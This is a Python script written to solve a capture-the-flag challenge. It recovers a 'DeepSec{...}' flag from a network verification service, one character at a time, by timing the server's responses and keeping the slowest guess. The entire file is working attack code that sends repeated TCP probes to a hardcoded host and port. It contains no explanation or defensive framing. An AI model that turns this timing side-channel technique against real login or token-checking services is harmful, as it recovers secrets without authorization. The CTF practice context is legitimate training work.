#!/usr/bin/env python3
"""
Timing Attack Script for Flag Verification
The server likely checks each character one by one, taking longer when more characters are correct.
"""
import socket
import time
import string

HOST = '10.25.1.225'  # Or use 'ctf.1337.ma' if running locally
PORT = 9999

# Flag format: DeepSec{...}
FLAG_PREFIX = "DeepSec{"
FLAG_SUFFIX = "}"
# Use common flag characters first for efficiency
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}-!@#$%^&*()"

def connect_and_send(flag_attempt):
    """Connect to server, send flag, measure response time"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((HOST, PORT))
        
        # Receive initial prompt
        response = s.recv(4096).decode()
        
        # Send flag attempt
        s.sendall((flag_attempt + '\n').encode())
        
        # Receive response
        response = s.recv(4096).decode()
        
        s.close()
        
        # Parse the server's reported verification time
        server_time = 0.0
        if "Verification time:" in response:
            import re
            match = re.search(r'Verification time:\s*([\d.]+)s', response)
            if match:
                server_time = float(match.group(1))
        
        # Check if we got the flag (look for success indicators, but exclude INCORRECT)
        is_correct = ("✅" in response or 
                     ("CORRECT" in response.upper() and "INCORRECT" not in response.upper()) or 
                     "Access granted" in response or 
                     ("SUCCESS" in response.upper() and "UNSUCCESSFUL" not in response.upper()) or
                     "You got it" in response or 
                     "congratulations" in response.lower())
        
        return server_time, response, is_correct
    except Exception as e:
        print(f"Connection error: {e}")
        return 0, "", False

def find_next_char(known_flag):
    """Find the next character by timing attack"""
    print(f"\nCurrent: {known_flag}")
    
    timings = {}
    success_flag = None
    
    # Try each character in the charset
    for char in CHARSET:
        test_flag = known_flag + char
        
        # Test multiple times to get average
        times = []
        for i in range(5):  # Increased to 5 attempts for better accuracy
            elapsed, response, is_correct = connect_and_send(test_flag)
            
            if is_correct:
                print(f"\n🎉 FOUND THE CORRECT FLAG: {test_flag}")
                success_flag = test_flag
                break
            
            if elapsed > 0:
                times.append(elapsed)
            time.sleep(0.05)  # Small delay between attempts
        
        if success_flag:
            return ('SUCCESS', success_flag)
        
        if times:
            avg_time = sum(times) / len(times)
            timings[char] = avg_time
            print(f"  '{char}': {avg_time:.6f}s (min: {min(times):.6f}s, max: {max(times):.6f}s)")
    
    if not timings:
        print("No timings collected!")
        return None
    
    # Character with longest time is likely correct
    best_char = max(timings.items(), key=lambda x: x[1])
    second_best = sorted(timings.items(), key=lambda x: x[1], reverse=True)[1] if len(timings) > 1 else (None, 0)
    
    print(f"\n>>> Best: '{best_char[0]}' with {best_char[1]:.6f}s")
    if second_best[0]:
        print(f"    2nd:  '{second_best[0]}' with {second_best[1]:.6f}s (diff: {best_char[1] - second_best[1]:.6f}s)")
    
    return best_char[0]

def timing_attack():
    """Perform timing attack to extract flag"""
    known_flag = FLAG_PREFIX
    
    # Extract flag character by character
    max_iterations = 50  # Safety limit
    for iteration in range(max_iterations):
        if known_flag.endswith(FLAG_SUFFIX):
            break
            
        result = find_next_char(known_flag)
        
        if result is None:
            print("Attack failed - no character found!")
            break
        
        # Check if we found the complete flag
        if isinstance(result, tuple) and result[0] == 'SUCCESS':
            return result[1]
        
        next_char = result
        known_flag += next_char
        print(f"\n{'='*60}")
        print(f"FLAG SO FAR: {known_flag}")
        print(f"{'='*60}\n")
        
        # Stop if we've found the closing brace
        if next_char == '}':
            break
    
    return known_flag

if __name__ == "__main__":
    print("=" * 60)
    print("TIMING ATTACK - Flag Verification")
    print("=" * 60)
    
    # First, let's see what the server says
    print("\nTesting connection to server...")
    elapsed, response, is_correct = connect_and_send("test")
    if response:
        print(f"Server response:")
        print(response)
        print(f"Response time: {elapsed:.6f}s\n")
    else:
        print("Failed to connect to server!")
        print("Make sure you're running this from a machine that can reach the CTF server.")
        exit(1)
    
    # Start the attack
    print("\nStarting timing attack...")
    print("This will try each character and measure response times.")
    print("The character that takes longest to verify is likely correct.\n")
    
    flag = timing_attack()
    
    print("\n" + "=" * 60)
    print(f"FINAL FLAG: {flag}")
    print("=" * 60)
    
    # Verify the flag
    print("\nVerifying flag with server...")
    elapsed, response, is_correct = connect_and_send(flag)
    print(response)
    if is_correct:
        print("\n🎉 SUCCESS! Flag verified!")
    else:
        print("\n⚠️  Flag may not be complete. Check the output above.")
